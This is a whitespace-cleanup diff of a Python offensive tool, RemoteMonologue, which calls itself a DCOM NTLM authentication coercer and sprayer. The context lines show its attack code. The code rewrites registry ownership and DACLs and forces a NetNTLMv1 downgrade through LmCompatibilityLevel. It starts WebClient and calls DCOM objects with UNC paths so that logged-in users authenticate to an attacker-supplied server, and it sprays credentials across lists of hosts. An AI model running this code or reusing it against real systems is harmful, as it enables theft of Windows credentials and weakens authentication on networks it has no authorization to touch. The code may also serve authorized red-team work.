@@ -132,7 +132,7 @@ class RemoteMonologue:
             if not self.__webclient:
                 if not self.checkSMB():
                     return
-          
+
             smbclient = SMBConnection(self.__address, self.__address)
 
             if options.k is True:
@@ -162,7 +162,7 @@ class RemoteMonologue:
                             output_file.close()
                         return
 
-        
+
         dce.bind(rrp.MSRPC_UUID_RRP)
 
         reg_handle = rrp.hOpenLocalMachine(dce)
@@ -207,7 +207,7 @@ class RemoteMonologue:
 
             rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])
 
-            
+
             logging.debug(f"Changing OWNER and DACL for {registry_path}")
 
 
@@ -222,7 +222,7 @@ class RemoteMonologue:
             new_owner = (b'\x01\x00\x00\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                          b'\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05 \x00\x00\x00 \x02\x00\x00'
                          )
-            
+
             resp = self.hBaseRegSetKeySecurity(
                 dce,
                 key_handle["phkResult"],
@@ -346,7 +346,7 @@ class RemoteMonologue:
         if(self.__downgrade):
 
             logging.info("Running NetNTLMv1 downgrade attack")
-            
+
             ntlm_key_handle = rrp.hBaseRegOpenKey(
                 dce,
                 reg_handle["phKey"],
@@ -361,7 +361,7 @@ class RemoteMonologue:
                     ntlm_key_handle["phkResult"],
                     'LmCompatibilityLevel'
                     )
-                
+
                 ntlmVal = ntlm_value[1]
 
 
@@ -384,9 +384,9 @@ class RemoteMonologue:
                     logging.debug("LmCompatibilityLevel is under 3, no need to change it")
 
             except (Exception) as e:
-                
+
                 logging.debug("No LmCompatibilityLevel value discovered. Adding LmCompatibilityLevel to 2")
-                
+
                 ans = rrp.hBaseRegSetValue(
                     dce,
                     ntlm_key_handle["phkResult"],
@@ -394,7 +394,7 @@ class RemoteMonologue:
                     rrp.REG_DWORD,
                     2
                     )
-                
+
                 ntlmCreated = True
 
             rrp.hBaseRegCloseKey(dce, ntlm_key_handle["phkResult"])
@@ -495,7 +495,7 @@ class RemoteMonologue:
                 scmr.OWNER_SECURITY_INFORMATION,
                 )
 
-            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])        
+            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])
 
         rrp.hBaseRegCloseKey(dce, reg_handle["phKey"])
         dce.disconnect()
@@ -555,15 +555,15 @@ class RemoteMonologue:
         rpc = dce
         ans = scmr.hROpenSCManagerW(rpc)
         scManagerHandle = ans['lpScHandle']
-        
+
         try:
             ans = scmr.hROpenServiceW(rpc, scManagerHandle, "WebClient"+'\x00')
             serviceHandle = ans['lpServiceHandle']
         except Exception as e:
-            logging.error(f"WebClient service not accessible on {self.__address}")                
+            logging.error(f"WebClient service not accessible on {self.__address}")
             return
 
-    
+
         logging.info(f"Querying status for WebClient on {self.__address}")
         resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
         state = resp['lpServiceStatus']['dwCurrentState']
@@ -603,7 +603,7 @@ class RemoteMonologue:
                 self.registry_modifications()
             logging.info("Stopping WebClient service")
             scmr.hRControlService(rpc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
-        
+
         else:
             logging.error("WebClient can't be started. Try again with -downgrade instead.")
 
@@ -649,7 +649,7 @@ class RemoteMonologue:
                 index += 1
             except:
                 break
-        
+
 
         smbclient = SMBConnection(self.__address, self.__address)
         if options.k is True:
@@ -663,12 +663,12 @@ class RemoteMonologue:
         rpc.set_smb_connection(smbclient)
         dce = rpc.get_dce_rpc()
         dce.connect()
-        
+
         dce.bind(lsat.MSRPC_UUID_LSAT)
-        
+
         resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
         policyHandle = resp['PolicyHandle']
-       
+
         try:
             resp = lsat.hLsarLookupSids(dce, policyHandle, users,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
         except DCERPCException as e:
@@ -676,7 +676,7 @@ class RemoteMonologue:
                 pass
             elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                 resp = e.get_packet()
-            else: 
+            else:
                 raise
         if resp['TranslatedNames']['Names'] == []:
             logging.error("No one is currently logged in")
@@ -724,7 +724,7 @@ class RemoteMonologue:
                 dispParams['rgvarg'] = NULL
                 dispParams['rgdispidNamedArgs'] = NULL
                 dispParams['cArgs'] = 0
-                dispParams['cNamedArgs'] = 0                
+                dispParams['cNamedArgs'] = 0
 
                 if (self.__dcom == "UpdateSession"):
 
@@ -738,7 +738,7 @@ class RemoteMonologue:
                     iCreateUpdateServiceManager = IDispatch(self.getInterface(iUpdateSession, hCreateUpdateServiceManager['pVarResult']['_varUnion']['pdispVal']['abData']))
 
                     pAddScanPackageService = iCreateUpdateServiceManager.GetIDsOfNames(('AddScanPackageService',)) [0]
-                    
+
                     AuthenticationCoercer((iCreateUpdateServiceManager, pAddScanPackageService), self.__auth_to, self.__dcom)
 
                 elif (self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):
@@ -753,10 +753,10 @@ class RemoteMonologue:
                     iDataManager = IDispatch(self.getInterface(iServerDataCollectorSet, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                     pExtract = iDataManager.GetIDsOfNames(('extract',))[0]
 
-                    AuthenticationCoercer((iDataManager, pExtract), self.__auth_to, self.__dcom)              
+                    AuthenticationCoercer((iDataManager, pExtract), self.__auth_to, self.__dcom)
 
                 elif (self.__dcom == "FileSystemImage"):
-                    
+
                     # FileSystemImage CLSID for Interactive User authentication
                     iInterface = dcom.CoCreateInstanceEx(string_to_bin('2C941FC5-975B-59BE-A960-9A2A262853A5'), IID_IDispatch)
 
@@ -776,12 +776,12 @@ class RemoteMonologue:
                     AuthenticationCoercer((iMSTSWebProxy, pStartRemoteDesktop), self.__auth_to, self.__dcom)
 
                     print(text_green + "[+] Coerced SMB authentication! %+35s" % self.__address + text_end)
-                    
+
                     if self.__output != None:
                         output_file = open(self.__output, "a")
                         output_file.write("[+] Forced SMB authentication for Interactive User," + self.__address + "\n")
                         output_file.close()
-               
+
                 dcom.disconnect()
 
             except  (Exception) as e:
@@ -816,10 +816,10 @@ class RemoteMonologue:
                     	output_file.close()
                 else:
                     logging.error(str(e))
-                
+
                 dcom.disconnect()
                 sys.stdout.flush()
-            
+
             except KeyboardInterrupt:
                 sys.exit(0)
 
@@ -839,33 +839,33 @@ class RemoteMonologue:
                     if self.__output != None:
                     	output_file = open(self.__output, "a")
                     	output_file.write("[!] Network is unreachable," + self.__address + "\n")
-                    	output_file.close()                    
+                    	output_file.close()
             elif str(e).find("timed out") >= 0:
                     logging.debug("Connection timed out")
                     print(text_yellow + "[!] Connection timed out %+62s" % self.__address + text_end)
                     if self.__output != None:
                     	output_file = open(self.__output, "a")
                     	output_file.write("[!] Connection timed out," + self.__address + "\n")
-                    	output_file.close()   
+                    	output_file.close()
             elif str(e).find("Connection refused") >= 0:
                     logging.debug("Connection refused")
                     print(text_yellow + "[!] Connection refused %+64s" % self.__address + text_end)
                     if self.__output != None:
                     	output_file = open(self.__output, "a")
                     	output_file.write("[!] Connection refused," + self.__address + "\n")
-                    	output_file.close()                   
+                    	output_file.close()
             else:
                 logging.debug("Unkown error: " + str(e) + " for " + self.__address)
                 if self.__output != None:
                     	output_file = open(self.__output, "a")
                     	output_file.write("[!] Unknown error," + self.__address + "\n")
-                    	output_file.close()                 
+                    	output_file.close()
 
-            
+
         except KeyboardInterrupt:
             sys.exit(0)
-            
-        
+
+
 class AuthenticationCoercer():
 
     def __init__(self, executeUNCpath, auth_to, dcom):
@@ -873,12 +873,12 @@ class AuthenticationCoercer():
         self._auth_to = auth_to
         self.__dcom = dcom
         self.execute_remote()
-        
-        
+
+
     def execute_remote(self):
-    
+
         tmpShare = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
-    
+
         tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
 
         tmpFileName = tmpName + '.txt'
@@ -891,9 +891,9 @@ class AuthenticationCoercer():
 
             dispParams = DISPPARAMS(None, False)
             dispParams['rgdispidNamedArgs'] = NULL
-            dispParams['cArgs'] = 2	
+            dispParams['cArgs'] = 2
             dispParams['cNamedArgs'] = 0
-            
+
             arg0 = VARIANT(None, False)
             arg0['clSize'] = 5
             arg0['vt'] = VARENUM.VT_BSTR
@@ -905,7 +905,7 @@ class AuthenticationCoercer():
             arg1['vt'] = VARENUM.VT_BSTR
             arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
             arg1['_varUnion']['bstrVal']['asData'] = UNCpath
-            
+
             if (self.__dcom == "UpdateSession"):
                 dispParams['rgvarg'].append(arg1)
                 dispParams['rgvarg'].append(arg0)
@@ -919,9 +919,9 @@ class AuthenticationCoercer():
 
             dispParams = DISPPARAMS(None, False)
             dispParams['rgdispidNamedArgs'] = NULL
-            dispParams['cArgs'] = 2 
+            dispParams['cArgs'] = 2
             dispParams['cNamedArgs'] = 0
-            
+
             arg0 = VARIANT(None, False)
             arg0['clSize'] = 5
             arg0['vt'] = VARENUM.VT_BSTR
@@ -933,23 +933,23 @@ class AuthenticationCoercer():
             arg1['vt'] = VARENUM.VT_BSTR
             arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
             arg1['_varUnion']['bstrVal']['asData'] = "/edit " + UNCpath
-            
+
             dispParams['rgvarg'].append(arg1)
             dispParams['rgvarg'].append(arg0)
 
             self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
 
         elif(self.__dcom == "FileSystemImage"):
-            
+
             # Convert -3 to unsigned 32-bit
-            DISPID_PROPERTYPUT = 0xFFFFFFFD 
+            DISPID_PROPERTYPUT = 0xFFFFFFFD
 
             dispParams = DISPPARAMS(None, False)
             dispParams['rgvarg'] = []
             dispParams['rgdispidNamedArgs'] = [DISPID_PROPERTYPUT]
             dispParams['cArgs'] = 1
             dispParams['cNamedArgs'] = 1
-            
+
             arg0 = VARIANT(None, False)
             arg0['clSize'] = 12
             arg0['vt'] = VARENUM.VT_BSTR
@@ -959,7 +959,7 @@ class AuthenticationCoercer():
             dispParams['rgvarg'].append(arg0)
 
             self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x000, DISPATCH_PROPERTYPUT, dispParams, 0, [], [])
-       
+
 
 class AuthFileSyntaxError(Exception):
 
@@ -1029,21 +1029,21 @@ def parseServers(server):
 if __name__ == '__main__':
 
     print(text_green + """
- __   ___        __  ___  ___        __        __        __   __        ___ 
-|__) |__   |\/| /  \  |  |__   |\/| /  \ |\ | /  \ |    /  \ / _` |  | |__  
-|  \ |___  |  | \__/  |  |___  |  | \__/ | \| \__/ |___ \__/ \__> \__/ |___ 
-                                                                            
-                                  
+ __   ___        __  ___  ___        __        __        __   __        ___
+|__) |__   |\/| /  \  |  |__   |\/| /  \ |\ | /  \ |    /  \ / _` |  | |__
+|  \ |___  |  | \__/  |  |___  |  | \__/ | \| \__/ |___ \__/ \__> \__/ |___
+
+
                                                 """ + text_end)
 
     parser = argparse.ArgumentParser(add_help = True, description = "DCOM NTLM authentication coercer and sprayer")
-    
+
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
 
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-dcom', action='store', metavar = "", help='DCOM object  - ServerDataCollectorSet (default), FileSystemImage, MSTSWebProxy, UpdateSession (SYSTEM)')                      
+    parser.add_argument('-dcom', action='store', metavar = "", help='DCOM object  - ServerDataCollectorSet (default), FileSystemImage, MSTSWebProxy, UpdateSession (SYSTEM)')
     parser.add_argument('-auth-to', action='store', metavar = "ip address", help='Server for Interactive User to authenticate to over SMB')
     parser.add_argument('-spray', action='store_true', default = False,
                         help='Spray credentials against provided list of systems. Filename must be provided in domain/user@FILE')
@@ -1097,7 +1097,7 @@ if __name__ == '__main__':
 
     if (options.auth_to == None and options.query == False):
         logging.error("Must specify the server for the target to authenticate to (-auth-to)")
-        sys.exit(0)     
+        sys.exit(0)
 
 
     if options.spray == False:
@@ -1131,14 +1131,14 @@ if __name__ == '__main__':
                     with open(addresses) as serverfile:
                         for line in serverfile:
                             if line.strip():
-                                targets.extend(parseServers(line.strip()))                   
+                                targets.extend(parseServers(line.strip()))
 
                 for x in range(len(targets)):
                     address = targets[x]
                     executer = RemoteMonologue(username, password, domain, address, options.hashes, options.aesKey,
                             options.k, options.dc_ip,options.auth_to, options.output, options.dcom, options.downgrade, options.webclient, options.timeout)
                     executer.run()
-                    
+
         else:
 
             executer = RemoteMonologue(username, password, domain, address, options.hashes, options.aesKey,
